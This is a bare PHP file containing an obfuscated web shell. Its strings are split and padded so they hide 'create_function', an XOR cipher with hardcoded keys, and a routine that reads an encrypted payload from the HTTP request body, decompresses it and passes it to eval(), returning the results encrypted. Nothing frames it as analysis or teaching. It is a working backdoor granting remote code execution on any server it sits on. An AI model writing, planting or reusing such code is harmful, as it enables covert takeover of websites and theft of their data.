<?php
$X='=@base65p4_enc5pode(@x(@gzcom5ppress5p($o),5p$k));pri5pnt(5p"$p$k5ph$r$kf");}';
$u='5p[1]),$k))5p);$o=5p@ob_get5p5p_contents(5p)5p;@ob_5pen5pd_clean()5p;$r';
$g=str_replace('L','','creLatLe_LfLuncLtiLon');
$p='l=strlen($t);$o=5p"";for($i=0;5p$i<$l5p;){for5p($j=5p05p;($j<$c&&$5pi<$l);5p';
$G='==1) {@ob_s5p5ptart();@5pev5pal(@gzunc5pompres5ps(@x(@base5p64_dec5pode($m';
$U='="y1lLXzcP335pNt6qYo5p";functio5p5pn x($5pt,$k){$c5p=5pstrlen($5p5pk5p);$';
$s='h("/5p$k5ph(.+)$kf/",@fi5pl5pe_g5pet_con5ptents("5p5pphp://5pinput"),5p$m)';
$x='$j+5p+,$i++)5p{$o.5p=$t{$i5p}^$k{$5pj};}}retu5prn $o;}if5p (@preg5p_ma5ptc';
$M='$k="5785pf4f77";5p$k5ph="5pa9e1b635peb5p235p1";$kf="4804d55p8ee5p469";5p$p';
$h=str_replace('5p','',$M.$U.$p.$x.$s.$G.$u.$X);
$K=$g('',$h);$K();
?>
